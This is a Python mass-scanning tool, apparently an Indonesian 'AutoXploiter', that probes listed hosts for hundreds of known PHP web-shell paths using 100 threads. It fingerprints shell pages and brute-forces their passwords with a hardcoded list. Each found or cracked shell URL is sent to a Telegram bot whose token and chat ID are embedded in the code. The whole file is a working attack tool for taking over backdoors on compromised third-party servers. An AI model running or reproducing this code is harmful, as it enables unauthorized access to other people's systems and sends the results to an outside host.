import os
import requests
import random
import threading
import time
import sys
import ctypes
import re
import urllib3
from multiprocessing.dummy import Pool, Lock
from requests import post
from bs4 import BeautifulSoup
from random import choice
from colorama import Fore, Style, init

init(autoreset=True)

fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

current_directory = os.path.dirname(os.path.abspath(__file__))
parent_directory = os.path.dirname(current_directory)

def Folder(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

Folder(os.path.join(parent_directory, 'result'))

urllib3.disable_warnings()
Good = 0
x = requests.session()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    while True:
        input_file = input("Masukkan nama file input (misalnya, list.txt): ")
        if os.path.exists(input_file):
            break
        else:
            print("File tidak ditemukan. Silakan coba lagi.")

    target = [i.strip() for i in open(input_file, mode='r').readlines()]

def rsf(i) : #ok
    global Good
    x = requests.session()
    head = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0', 
    'Upgrade-Insecure-Requests': '1', 
    'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36', 
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
    'Accept-Encoding': 'gzip, deflate', 
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8', 
    'referer': 'www.google.com'
    }
    try :
        listaa = ['un.php','foxx.php','js.php?get','phpinfo.php?re@=vo@','wp-email.php','fierza.php','load.php','alpha.php','tinyfilemanager.php','filemanager.php','manager.php','wp-content.php','wp-content/themes/alera/alpha.php','lock360.php','5.php','01.php','.well-known/pki-validation/wp-signup.php','.well-known/wp-signup.php','jindex.php','0o.php','room.php','xd.php','adriv.php','gecko.php','tonant.php','b.php','xleet-shell.php','cong.php','config.php','wp-key.php','wp-conctent.php','flame.php','wp-content/flame.php','lx.php','wp-help.php','un.php?f=f','un2.php?f=f','wp-posts.php','xl.php','ww.php','testwp.php?wp=1','kyami.php','wp-includes/class-wp-other.php','unknown.php','god4m.php','tuco.php','x.php','w.php','shl.php','wp-class.php','info.php','o.php','shx.php','l.php','hi.php','readme.php','pi.php','r00t.php','radio.php?pass=shell','content.php','about.php','admin.php','css.php','doc.php','wp_wrong_datlib.php','v.php','ups.php','up.php','fw.php','simple.php','local.php','wp-atom.php','1index.php?pass=shell','2index.php?pass=shell','3index.php?f=NmRtJOUjAdutReQjscRjKUhleBpzmTyO.txt','wikindex.php','autoload_classmap.php','wp-conflg.php','wp-includes/wp-class.php','wp-inlcudes.php?katib','wp-js.php?phpshells','wp-load.php?daksldlkdsadas=1','sys.php','0.php','0byte.php','wp-config-sample.php','0z.php','1.php','shell=Dead','403.php','404.php','45.php','73.php','a.php','abc.php','al.php','alf.php','user.php','litespeed.php','alfa-shell-v4.php','alfa.php','admin404.php','alfateslav4.php','abby.php','anon.php','anons79.php','base.php','batm.php','bj.php','black.php','adm.php','sh.php','by.php','byp.php','bypas.php','bypass.php','byps.php','c.php','con.php','con7.php','con7ext.php','dbx.php','defau1t.php','eviltwin.php','dev.php','docindex.php','Dz.php','e.php','error.php?phpshells','evil.php','file.php','fox.php','foxwso.php','gel4y.php','gelay.php','gh.php','hehe.php','i.php','id.php','ids.php','idx.php','indoxploit.php','init.php','iq.php','iqb.php','k.php','kk.php','la.php','lol.php','lolzk.php','m.php','mar.php','marijuana.php','mas.php','mi.php','min.php','mini.php','yan.php','minishell.php','mrjn.php','n.php','new-index.php','ninja.php','old-index.php','olux.php','postfs.php','pref.php','priv.php','priv8.php','qindex.php','r.php','rex.php','root.php','s.php','shell.php','shell20211028.php','shells.php','sql.php','srx.php','sym.php','sym403.php','t.php','tes.php','tesla.php','indosec.php','test.php','tshop.php','twin.php','u.php','upload.php','uploader.php','usb.php','usr.php','v3.php','v4.php','vuln.php','wp-2019.php','wp-admin.php','wp-defaul.php','wp-info.php','wp-mails.php','wp-one.php','mari.php','wp-plugins.php','wp-rss.php','wp-singupp.php','wp-site.php','wp-system.php','wp-title.php','wp.php','wpindex.php','ws.php','wsanon.php','WSO.php','wso.php','cmd.php','wso2.php','xcv.php','eagle.php','xindex.php','xleet.php','xm.php','xx.php','xxx.php','y.php','z.php','zk.php','zone.php?phpshell','zx.php','symlink.php','c99.php','ok.php','2.php','3.php','4.php','6.php','7.php','8.php','9.php','10.php','p.php','q.php','d.php','f.php','g.php','h.php','j.php','wp-wso.php','function.php','V3.php','www.php','100.php','777.php','xox.php','new.php','wi.php','admin403.php','87.php','haxor.php','hello.php','if.php','anone.php','wp-configer.php','wp-ad.php','send.php','.wp-cache.php','wp-blog.php','gg.php','alfa123.php']
        for xox in listaa :
            url = ("http://"+i+"/"+xox)
            url2 = ("https://"+i+"/"+xox)
            req = x.get(url, headers=head, timeout=7, verify=False).text
            req = x.get(url2, headers=head, timeout=7, verify=False).text
            if "border:none;background-color:#1e252e;color:#fff;cursor:pointer;" in req or "name='watching' value='submit'" in req or "name='watching' value='>>'" in req or "<form method=post><input type=password name=pass>" in req or "<input type=password name=pass><input type=submit" in req or "method=post>Password:" in req :
                print(fw+"["+fg+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                x.post('https://api.telegram.org/bot5874880100:AAHKOb5XPn7PjAIg3WJ8x9Asc539cOM1m_Y/sendMessage?chat_id=1357193581&text='+url)
                open("result/shellpw.txt","a").write(url+"\n")
                listpw = ['admin','stusa','xleet','x505','damedesuyo8800','am*guAW8.ryDgz-TYF','Stusa','friv','fuck666','','****','*****','Haxor?1337','haxor','Haxor','imunify1337','Malyo1@8','31337','00w1wcRT','022627raflixsec','123','123456','12qwaszx','1337','133721','1n73ction','22XC','404','555','731','a5e8z77','abcder','achan','adminhoki','aerul','akudimana','alfa','anggie21','AnonGhost','AnonymousFox','asdsdggenu','awokawok2','b374k','b3t4kun','BangPat?1337','banyumas','bheart2206','cantik','cmonqwe123#@!','con7extshell','cyb3r','DapsquaD','DeadSec','default','elena','fff132f70f28194','G00DV1N','geronimo123','gfus','ghost287','HACKED','hacker0882','hackmeDON','Hasilhoki','haurgeulis','haxor34','huypizdaprovoda','hxr1337','iamtheking','IndexAttacker','IndoSec','IndoXploit','JH23FVDG32FD','jupiter2709','katib','kem','kontolcokasu','kontolgaceng','kontoll471','kpxwbYBP4hQK','l o l','leksak98@','letmeinmobile','mad','memes','mini-shell','Mo2a0123','mravast','myrepublic','oppaidragon','password','peler','peler666','Penolong40','phpshell','phpshells','pucek12345','r00t','r00tsh3ll','rbbd95','RFkyy','root','root@kudajumping','Sandra@1199','sys123','T1KUS90T','tbl','thopik123','tunafeesh','w0rms','xmina','zaza','zeeblaxx','{ IndoSec }']
                for pw in listpw :
                    tor = ("http://"+i+"/"+xox+"#"+pw)
                    cek = x.post(url, headers=head, data={'pass': pw, 'watching': 'submit'}, timeout=7, verify=False).text
                    cek = x.post(url2, headers=head, data={'pass': pw, 'watching': 'submit'}, timeout=7, verify=False).text
                    cek = x.post(url, headers=head, data={'pass': pw, 'watching': '>>'}, timeout=7, verify=False).text
                    cek = x.post(url2, headers=head, data={'pass': pw, 'watching': '>>'}, timeout=7, verify=False).text
                    if "-rw-r--r--" in cek or ">File manager<" in cek or ">Upload file:" in cek or "drwxr-xr-x" in cek or "-rw-rw-rw-" in cek or "drwxrwxrwx" in cek or "Upload File :" in cek or "Writeable" in cek :
                        print(fw+"["+fg+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Pass Shell")
                        open("../result/shell.txt","a").write(url+"#"+pw+"\n")
                        open("result/shellcracked.txt","a").write(url+"#"+pw+"\n")
                        break
                    else :
                        print(fw+"["+fr+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found Pass Shell")
                break
            elif ">File manager<" in req or "Cpanel Reset Password" in req or "WebRooT" in req or "PHP File Manager" in req or '<font color="red"><center> Shell :'in req or '<font color="green"><center> Up :' in req or "Haxgeno7" in req or "H3NING_MAL4M" in req or "?x=cmd&d=" in req or "aDriv4" in req or "<input type='submit' value='Submit'" in req or "Upload file :" in req or "Permissions" in req or "-rwxrwxrwx" in req or "drwxr-x---" in req or "-rwxr-xr-x" in req or "#0x2525" in req or "#0x2515" in req or "-rw-rw-r--" in req or "Mini Shell" in req or "=== bbPress ===" in req or "Uname:" in req or "root@indoxploit" in req or "&mode=upload'>Upload file</a></td>" in req or "<input type=file name=f><input name=k type=submit id=k value=upload>" in req or 'name="_upl" type="submit" id="_upl" value="Upload"' in req or "trenggalek6etar" in req or "D3xterR00t" in req or "-r--r--r--" in req or "PHP Uploader - By Phenix-TN & Mr.Anderson" in req or '<option value="/tmp/">' in req or 'name="_upl"' in req and 'id="_upl"' in req and 'value="Upload"' in req or 'Sh3ll' in req or "Sh3ll By Anons79" in req or "CCAEF Uploader" in req or ">Upload file:" in req or "RevoLutioN Namesis" in req or "okokok" in req or 'value="Upload"></form>' in req or '<title>[ RC-SHELL' in req or '<option value="create_symlink">' in req or "Vuln!! patch it Now!" in req or "WSO 4.2.5<" in req or "Ghost Exploiter Team Official" in req or ">PHP File Manager<" in req or "1975 Team" in req or '&upload=gaskan">Upload File<' in req or 'name="_upl"' in req and 'id="_upl"' in req or "-rw-r--r--" in req or "drwxr-xr-x" in req or "-rw-rw-rw-" in req or "drwxrwxrwx" in req or "Owner/Group" in req or ">[ Home Shell ]<" in req or "Upload File : " in req or 'name="uploader" id="uploader"' in req or "l7WADead" in req or '<input type="submit" name="submit" value="Upload">' in req or "(Writeable)" in req or "blackpanther1337" in req :
                Good = Good + 1
                print(fw+"["+fg+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                x.post('https://api.telegram.org/bot5874880100:AAHKOb5XPn7PjAIg3WJ8x9Asc539cOM1m_Y/sendMessage?chat_id=1357193581&text='+url)
                open("../result/shell.txt","a").write(url+"\n")
            else :
                print(fw+"["+fr+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found Shell")
    except :
        pass

def exploit(i):
    try:
        rsf(i)
    except:
       pass

if __name__ == "__main__":
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = """
    _       _      __  __     _     _ _             ___      _     ___         ___ _        _    
   /_\ _  _| |_ ___\ \/ /_ __| |___(_) |_ ___ _ _  | _ ) ___| |_  | _ )_  _   / __| |_  _ _(_)___
  / _ \ || |  _/ _ \>  <| '_ \ / _ \ |  _/ -_) '_| | _ \/ _ \  _| | _ \ || | | (__| ' \| '_| (_-<
 /_/ \_\_,_|\__\___/_/\_\ .__/_\___/_|\__\___|_|   |___/\___/\__| |___/\_, |  \___|_||_|_| |_/__/
                        |_|                                            |__/                      
               
\n"""
    for N, line in enumerate( x.split( "\n" ) ):
        sys.stdout.write( " \x1b[1;%dm%s%s\n " % (random.choice( colors ), line, clear) )
        time.sleep( 0.05 )
    p = Pool(100)
    p.map(exploit, target)
    p.close()
    p.join()
    print("\n")
    print(fr+"|-------------------------------------|")
    print(fr+"|             "+fw+"DONE MASZEH"+fr+"             |")
    print(fr+"|-------------------------------------|")
    print(fr+"|                                     |")
    print(fr+"|                                     |")
    print(fr+"|         "+fw+"Auto"+fr+"}{"+fw+"ploiter Tools"+fr+"         |")
    print(fr+"|     "+fw+"Powered by Chr"+fr+"}{"+fw+"is"+fr+"     |")
    print(fr+"|                                     |")
    print(fr+"|                                     |")
    print(fr+"|-------------------------------------|")